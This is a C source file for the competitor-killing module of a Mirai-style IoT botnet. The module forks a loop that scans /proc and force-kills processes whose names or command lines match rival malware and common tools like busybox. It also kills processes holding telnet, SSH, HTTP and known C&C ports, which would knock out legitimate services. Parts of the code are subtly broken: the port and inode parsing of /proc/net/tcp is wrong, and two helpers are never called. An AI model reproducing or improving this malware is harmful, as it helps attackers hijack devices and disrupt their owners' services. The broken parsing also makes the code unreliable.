#include "includes.h"
#include "killer.h"
#include "table.h"
#include "util.h"

#ifdef KILLER

#define KILLER_MIN_PID 400
#define KILLER_RESTART_SCAN_TIME 600

/* Competing malware process names */
static char *killer_process_names[] = {
    "mirai",
    "gafgit",
    "tsunami",
    "kawauchi",
    "dvrhelper",
    "busybox",
    "anime",
    "qbot",
    "ircbot",
    "bot",
    "miner",
    "xmr",
    NULL
};

/* Ports used by competing malware */
static uint16_t killer_ports[] = {
    23,     // Telnet
    22,     // SSH
    80,     // HTTP
    443,    // HTTPS
    48101,  // Mirai C&C
    1991,   // Tsunami
    1338,   // Other botnets
    6666,   // IRC
    6667,   // IRC
    8080,   // Alternative HTTP
    0       // End marker
};

static void killer_kill_by_port(uint16_t);
static void killer_kill_by_name(char *);
static BOOL memory_scan_match(char *, int);

void killer_init(void) {
    if (fork() == 0) {
        time_t last_scan = 0;
        
        while (TRUE) {
            time_t now = time(NULL);
            
            /* Scan every KILLER_RESTART_SCAN_TIME seconds */
            if (now - last_scan > KILLER_RESTART_SCAN_TIME) {
                int pid;
                char path[256];
                char exe_path[256];
                char cmdline[4096];
                
                last_scan = now;
                
                /* Scan /proc for processes */
                DIR *dir = opendir("/proc");
                if (dir == NULL) continue;
                
                struct dirent *entry;
                while ((entry = readdir(dir)) != NULL) {
                    /* Check if entry is a PID */
                    pid = util_atoi(entry->d_name);
                    if (pid < KILLER_MIN_PID) continue;
                    
                    /* Check /proc/[pid]/exe */
                    snprintf(path, sizeof(path), "/proc/%s/exe", entry->d_name);
                    int len = readlink(path, exe_path, sizeof(exe_path) - 1);
                    if (len > 0) {
                        exe_path[len] = 0;
                        
                        /* Check if process name matches known malware */
                        char *name = strrchr(exe_path, '/');
                        if (name != NULL) name++;
                        else name = exe_path;
                        
                        /* Kill by name */
                        char **proc_name;
                        for (proc_name = killer_process_names; *proc_name != NULL; proc_name++) {
                            if (util_stristr(name, util_strlen(name), *proc_name) != NULL) {
                                kill(pid, SIGKILL);
                                break;
                            }
                        }
                    }
                    
                    /* Check /proc/[pid]/cmdline */
                    snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
                    int fd = open(path, O_RDONLY);
                    if (fd != -1) {
                        len = read(fd, cmdline, sizeof(cmdline) - 1);
                        close(fd);
                        
                        if (len > 0) {
                            cmdline[len] = 0;
                            
                            /* Check for malware patterns */
                            char **proc_name;
                            for (proc_name = killer_process_names; *proc_name != NULL; proc_name++) {
                                if (util_stristr(cmdline, len, *proc_name) != NULL) {
                                    kill(pid, SIGKILL);
                                    break;
                                }
                            }
                        }
                    }
                }
                
                closedir(dir);
                
                /* Kill processes on known malware ports */
                uint16_t *port;
                for (port = killer_ports; *port != 0; port++) {
                    killer_kill_by_port(*port);
                }
            }
            
            sleep(10);
        }
    }
}

static void killer_kill_by_port(uint16_t port) {
    FILE *fp;
    char line[512];
    
    fp = fopen("/proc/net/tcp", "r");
    if (fp == NULL) return;
    
    while (fgets(line, sizeof(line), fp) != NULL) {
        char *local_addr;
        char *remote_addr;
        char *state;
        char *inode;
        int pid;
        
        /* Parse /proc/net/tcp line */
        /* Format: sl local_address remote_address st tx_queue rx_queue tr tm->when retrnsmt uid timeout inode */
        
        /* Look for port in local address (format: IP:PORT in hex) */
        local_addr = strstr(line, ":");
        if (local_addr != NULL) {
            local_addr++;
            uint16_t local_port = (uint16_t)strtoul(local_addr, NULL, 16);
            
            if (local_port == port) {
                /* Found process listening on port - try to kill */
                /* Get inode and find PID */
                inode = strstr(line, "inode");
                if (inode != NULL) {
                    /* Search /proc for matching inode */
                    DIR *dir = opendir("/proc");
                    if (dir != NULL) {
                        struct dirent *entry;
                        while ((entry = readdir(dir)) != NULL) {
                            if (util_atoi(entry->d_name) < KILLER_MIN_PID) continue;
                            
                            char fd_path[512];
                            snprintf(fd_path, sizeof(fd_path), "/proc/%s/fd", entry->d_name);
                            
                            DIR *fd_dir = opendir(fd_path);
                            if (fd_dir != NULL) {
                                struct dirent *fd_entry;
                                while ((fd_entry = readdir(fd_dir)) != NULL) {
                                    char link_path[512];
                                    char link_target[512];
                                    
                                    snprintf(link_path, sizeof(link_path), "%s/%s", fd_path, fd_entry->d_name);
                                    int len = readlink(link_path, link_target, sizeof(link_target) - 1);
                                    if (len > 0) {
                                        link_target[len] = 0;
                                        if (strstr(link_target, "socket:") != NULL && 
                                            strstr(link_target, inode) != NULL) {
                                            kill(util_atoi(entry->d_name), SIGKILL);
                                        }
                                    }
                                }
                                closedir(fd_dir);
                            }
                        }
                        closedir(dir);
                    }
                }
            }
        }
    }
    
    fclose(fp);
}

static void killer_kill_by_name(char *name) {
    DIR *dir;
    struct dirent *entry;
    
    dir = opendir("/proc");
    if (dir == NULL) return;
    
    while ((entry = readdir(dir)) != NULL) {
        int pid = util_atoi(entry->d_name);
        if (pid < KILLER_MIN_PID) continue;
        
        char exe_path[256];
        snprintf(exe_path, sizeof(exe_path), "/proc/%s/exe", entry->d_name);
        
        char link_target[256];
        int len = readlink(exe_path, link_target, sizeof(link_target) - 1);
        if (len > 0) {
            link_target[len] = 0;
            
            char *proc_name = strrchr(link_target, '/');
            if (proc_name != NULL) proc_name++;
            else proc_name = link_target;
            
            if (util_stristr(proc_name, util_strlen(proc_name), name) != NULL) {
                kill(pid, SIGKILL);
            }
        }
    }
    
    closedir(dir);
}

static BOOL memory_scan_match(char *path, int len) {
    /* Scan memory for malware signatures */
    char *signatures[] = {
        "mirai",
        "tsunami",
        "gafgit",
        NULL
    };
    
    char **sig;
    for (sig = signatures; *sig != NULL; sig++) {
        if (util_memsearch(path, len, *sig, util_strlen(*sig)) != -1) {
            return TRUE;
        }
    }
    
    return FALSE;
}

#endif
